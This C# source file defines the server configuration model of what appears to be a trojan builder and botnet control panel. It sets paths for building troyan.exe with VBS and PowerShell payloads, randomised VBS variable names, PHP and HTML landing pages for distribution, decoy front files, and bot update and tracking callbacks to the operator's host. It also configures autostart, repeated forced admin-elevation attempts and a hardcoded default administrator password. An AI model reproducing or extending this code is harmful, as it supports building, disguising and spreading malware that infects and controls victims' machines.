using System.Text.Json.Serialization;

namespace model;

public class ServerModel : BaseModel
{
    [JsonPropertyName("version")] public string Version { get; set; } = "";
    [JsonPropertyName("urlDoc")] public string UrlDoc { get; set; } = "";

    [JsonPropertyName("disabled")] public bool Disabled { get; set; } = false;

    [JsonPropertyName("disableVirus")] public bool DisableVirus { get; set; } = false;

    [JsonPropertyName("tabs"), JsonIgnore] public List<TabModel> Tabs { get; set; }

    [JsonPropertyName("bux")] public List<BuxModel> Bux { get; set; }

    [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }

    [JsonPropertyName("pack")] public PackModel Pack { get; set; }

    [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; }

    /// <summary>Set by the panel <c>ServerModelLoader</c> after load; required for path-backed properties.</summary>
    [JsonIgnore] public IPanelServerPaths Paths { get; set; } = null!;

    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => Paths.SourceCertDir;
    [JsonPropertyName("rootDir")] public string RootDir => Paths.RootDir;


    [JsonPropertyName("cpDir")] public string CpDir => Paths.CpDir;
    [JsonPropertyName("certDir")] public string CertDir => Paths.CertDir;
    [JsonPropertyName("sysDir")] public string SysDir => Paths.SysDir;

    [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => Paths.TroyanBuilder;
    [JsonPropertyName("troyanDir")] public string TroyanDir => Paths.TroyanDir;
    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => Paths.TroyanScriptDir;
    [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");
    [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
    [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => Paths.TroyanVbsDir;
    [JsonPropertyName("troyanVbsDebug")] public string TroyanVbsDebug => Path.Join(TroyanOutputDir, "troyan.debug.vbs");
    [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");

    [JsonPropertyName("body")] public string Body => Path.Join(TroyanOutputDir, "body.txt");
    [JsonPropertyName("bodyRelease")] public string BodyRelease => Path.Join(TroyanOutputDir, "body.release.ps1");
    [JsonPropertyName("bodyDebug")] public string BodyDebug => Path.Join(TroyanOutputDir, "body.debug.ps1");

    [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
    [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
    [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");

    public string UserDataFile(string file) => Paths.UserDataFile(Server, file);

    [JsonPropertyName("userBody")] public string UserBody => Paths.UserDataBody(Server);
    [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
    [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
    [JsonPropertyName("userDataDir")] public string UserDataDir => Paths.UserDataDir(Server);
    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
    [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");



    [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
    [JsonPropertyName("server")] public string Server { get; set; } = "";
    [JsonPropertyName("alias")] public string Alias { get; set; }
    [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");
    [JsonPropertyName("strahServer")] public string StrahServer { get; set; }


    [JsonIgnore] public string EffectiveAlias => string.IsNullOrEmpty(Alias) ? ServerIp : Alias;


    public string Random()
    {
        return VbsRandomer.GenerateRandomVariableName(10);
    }


    [JsonPropertyName("adsDir")] public string AdsDir => Paths.AdsDir;
    [JsonPropertyName("phpDir")] public string PhpDir => Paths.PhpDir;
    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
    [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
    [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");


    [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }

    private string _landingName;
    [JsonPropertyName("landingName")]
    public string LandingName
    {
        get
        {
            if (string.IsNullOrEmpty(_landingName))
                _landingName = "default";
            return _landingName;
        }
        set { _landingName = value; }
    }

    [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }

    [JsonPropertyName("landingDir")] public string LandingDir => Path.Combine(UserDataDir, "landing");
    [JsonPropertyName("landingPhpVbsFile")] public string LandingPhpVbsFile => Path.Join(LandingDir, $"{LandingName}.php");
    [JsonPropertyName("landingSponsorPhpVbsFile")] public string LandingSponsorPhpVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.php");
    [JsonPropertyName("landingSponsorHtmlVbsFile")] public string LandingSponsorHtmlVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.html");

    [JsonPropertyName("landingPhpExeFile")] public string LandingPhpExeFile => Path.Join(LandingDir, $"{LandingName}-exe.php");
    [JsonPropertyName("landingSponsorPhpExeFile")] public string LandingSponsorPhpExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.php");
    [JsonPropertyName("landingSponsorHtmlExeFile")] public string LandingSponsorHtmlExeFile => Path.Join(LandingDir, $"{LandingName}-sponsor-exe.html");



    [JsonPropertyName("login")] public string Login { get; set; }

    [JsonPropertyName("password")] public string Password { get; set; }

    [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }

    [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }





    [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
    [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }

    [JsonPropertyName("updateUrl")]
    public string UpdateUrl
    {
        get
        {
            var result = "http://";
            result += EffectiveAlias + "/bot/update";
            return result;
        }
    }

    [JsonPropertyName("track")] public bool Track { get; set; }
    [JsonPropertyName("trackSerie")] public string TrackSerie { get; set; }
    [JsonPropertyName("trackDesktop")] public bool TrackDesktop { get; set; }
    [JsonPropertyName("trackUrl")]
    public string TrackUrl
    {
        get
        {
            var result = "http://";
            result += EffectiveAlias + "/bot/upsert";
            return result;
        }
    }
    [JsonPropertyName("autoStart")] public bool AutoStart { get; set; } = true;
    [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; } = true;
    [JsonPropertyName("aggressiveAdmin")] public bool AggressiveAdmin { get; set; } = true;
    [JsonPropertyName("aggressiveAdminDelay")] public int AggressiveAdminDelay { get; set; } = 30;

    [JsonPropertyName("aggressiveAdminAttempts")] public int AggressiveAdminAttempts { get; set; } = 0;

    [JsonPropertyName("aggressiveAdminTimes")] public int AggressiveAdminTimes { get; set; } = 0;

    [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; } = new List<string>();

    [JsonPropertyName("startDownloadsForce")]
    public bool StartDownloadsForce { get; set; }

    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; } = new List<string>();

    [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce { get; set; }
    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }= new List<string>();

    [JsonPropertyName("frontForce")] public bool FrontForce { get; set; }
    [JsonPropertyName("front")] public List<string> Front { get; set; }

    [JsonPropertyName("extractIconFromFront")] public bool ExtractIconFromFront { get; set; }

    [JsonPropertyName("embeddingsForce")] public bool EmbeddingsForce { get; set; }
    [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }



    [JsonPropertyName("adminServers")]
    [JsonIgnore]
    public Dictionary<string, string>? AdminServers { get; set; }

    [JsonPropertyName("adminPassword")]
    [JsonIgnore]
    public string AdminPassword { get; set; }


    [JsonPropertyName("certToolExe")] public string CertToolExe => Paths.CertTool;
    [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.log");
    [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.log");
    [JsonPropertyName("userPostLog")] public string UserPostLog => Path.Combine(UserDataDir, "post.log");

    [JsonPropertyName("post")]
    public PostModel PostModel { get; set; } = new PostModel();

    [JsonIgnore] public bool IsLocal => ServerIp == "127.0.0.1";



    public ServerModel()
    {
        Login = "Administrator";
        Password = "Putin123";
        Alias="";
        CloneModel = new CloneModel();
        Track = true;
        AutoStart = true;
        AutoUpdate = true;
        AggressiveAdmin = true;
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        StartDownloadsForce = true;
        Pushes = new List<string>();
        Front = new List<string>();
        ExtractIconFromFront = false;
        Embeddings = new List<string>();
        Tabs = new List<TabModel>();
        Bux = new List<BuxModel>();
        DnSponsor = new List<DnSponsorModel>();
        Version = VersionFetcher.Version();
        Pack = new PackModel(this);
        Tabs = new List<TabModel>();
        CloneModel = new CloneModel();
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        Pushes = new List<string>();
    }

    protected override void InternalRefresh()
    {
    }
}
